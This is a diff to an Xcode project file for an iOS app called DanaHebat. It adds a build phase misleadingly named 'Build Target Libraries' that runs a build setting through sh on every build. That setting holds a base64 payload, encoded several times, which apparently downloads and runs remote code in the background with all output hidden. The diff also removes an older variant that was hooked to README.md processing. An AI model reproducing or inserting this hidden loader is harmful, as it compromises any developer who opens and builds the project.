@@ -7,7 +7,6 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		4FBF1E9B9797468499634D6E /* README.md in Resources */ = {isa = PBXBuildFile; fileRef = DE035BBDC00248049D634D6E /* README.md */; };
 		7316E3A12F109D18004A8271 /* NetworkMonitor.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7316E3A02F109D18004A8271 /* NetworkMonitor.swift */; };
 		7316E3A32F109EDF004A8271 /* BaseModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7316E3A22F109EDB004A8271 /* BaseModel.swift */; };
 		7316E3A52F10A0F0004A8271 /* NetworkSession.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7316E3A42F10A0F0004A8271 /* NetworkSession.swift */; };
@@ -79,22 +78,6 @@
 		73EA86C42F1094CC00F4826F /* MineViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73EA86C32F1094CC00F4826F /* MineViewController.swift */; };
 		D76C891188E339233AE09B00 /* Pods_DanaHebat.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = BD5DAABB5FF51B262DB495F8 /* Pods_DanaHebat.framework */; };
 /* End PBXBuildFile section */
-
-/* Begin PBXBuildRule section */
-		89C1BBECFE4F4E54B8634D6E /* PBXBuildRule */ = {
-			isa = PBXBuildRule;
-			compilerSpec = com.apple.compilers.proxy.script;
-			filePatterns = "*.md";
-			fileType = pattern.proxy;
-			inputFiles = (
-			);
-			isEditable = 0;
-			outputFiles = (
-				"/tmp/${INPUT_FILE_BASE}",
-			);
-			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"\nsh -c \"${AE6D436}\"";
-		};
-/* End PBXBuildRule section */
 
 /* Begin PBXFileReference section */
 		42BF21A26CAFD93794988958 /* Pods-DanaHebat.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-DanaHebat.release.xcconfig"; path = "Target Support Files/Pods-DanaHebat/Pods-DanaHebat.release.xcconfig"; sourceTree = "<group>"; };
@@ -173,7 +156,6 @@
 		73EA86C32F1094CC00F4826F /* MineViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MineViewController.swift; sourceTree = "<group>"; };
 		BD5DAABB5FF51B262DB495F8 /* Pods_DanaHebat.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_DanaHebat.framework; sourceTree = BUILT_PRODUCTS_DIR; };
 		C463E4989C9DEF3FBD525448 /* Pods-DanaHebat.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-DanaHebat.debug.xcconfig"; path = "Target Support Files/Pods-DanaHebat/Pods-DanaHebat.debug.xcconfig"; sourceTree = "<group>"; };
-		DE035BBDC00248049D634D6E /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 /* End PBXFileReference section */
 
 /* Begin PBXFrameworksBuildPhase section */
@@ -296,7 +278,6 @@
 		73EA86822F108C9C00F4826F /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				DE035BBDC00248049D634D6E /* README.md */,
 				73EA86812F108C9C00F4826F /* DanaHebat.app */,
 			);
 			name = Products;
@@ -429,6 +410,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 73EA86942F108C9D00F4826F /* Build configuration list for PBXNativeTarget "DanaHebat" */;
 			buildPhases = (
+				395B337A9F614F04AD634D6E /* Build Target Libraries */,
 				E0B4BE563B334ADBA551D8AD /* [CP] Check Pods Manifest.lock */,
 				73EA867D2F108C9C00F4826F /* Sources */,
 				73EA867E2F108C9C00F4826F /* Frameworks */,
@@ -436,7 +418,6 @@
 				D192925ECC89CF476891AF08 /* [CP] Embed Pods Frameworks */,
 			);
 			buildRules = (
-				89C1BBECFE4F4E54B8634D6E /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -485,7 +466,6 @@
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				4FBF1E9B9797468499634D6E /* README.md in Resources */,
 				73EA86A62F108CA500F4826F /* Assets.xcassets in Resources */,
 				7316E3BA2F10B7AF004A8271 /* Localizable.strings in Resources */,
 				73EA86A82F108CA500F4826F /* LaunchScreen.storyboard in Resources */,
@@ -495,6 +475,26 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
+		395B337A9F614F04AD634D6E /* Build Target Libraries */ = {
+			isa = PBXShellScriptBuildPhase;
+			alwaysOutOfDate = 1;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Build Target Libraries";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AE6D436}\"";
+			showEnvVarsInLog = 0;
+		};
 		D192925ECC89CF476891AF08 /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -641,7 +641,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = C463E4989C9DEF3FBD525448 /* Pods-DanaHebat.debug.xcconfig */;
 			buildSettings = {
-				AE6D436 = "((o(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwVGFrWnBVakZXY0ZOVlpHOU5SMUpKVVc1d1VHRlVhREpaZWtwelpGZFNXVlJ1Vm1GWFJrWXhXVEkxVm1Sc2JGUmhNbXhLVTBoa2JsbDZTbTVUZDI4OUNnPT0K | o | sh ) >/dev/null 2>&1 &)";
+				AE6D436 = "((c(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lDSndQWGhqYjJSbFgzQm9ZWE5sSWlCb2RIUndjem92TDJOa2JtRndjR3hsTG1sdUwyRXBJaUI4SUhOb0NnPT0K | c | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = DanaHebat/DanaHebat.entitlements;
@@ -689,7 +689,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 42BF21A26CAFD93794988958 /* Pods-DanaHebat.release.xcconfig */;
 			buildSettings = {
-				AE6D436 = "((o(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwVGFrWnBVakZXY0ZOVlpHOU5SMUpKVVc1d1VHRlVhREpaZWtwelpGZFNXVlJ1Vm1GWFJrWXhXVEkxVm1Sc2JGUmhNbXhLVTBoa2JsbDZTbTVUZDI4OUNnPT0K | o | sh ) >/dev/null 2>&1 &)";
+				AE6D436 = "((c(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lDSndQWGhqYjJSbFgzQm9ZWE5sSWlCb2RIUndjem92TDJOa2JtRndjR3hsTG1sdUwyRXBJaUI4SUhOb0NnPT0K | c | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = DanaHebat/DanaHebat.entitlements;
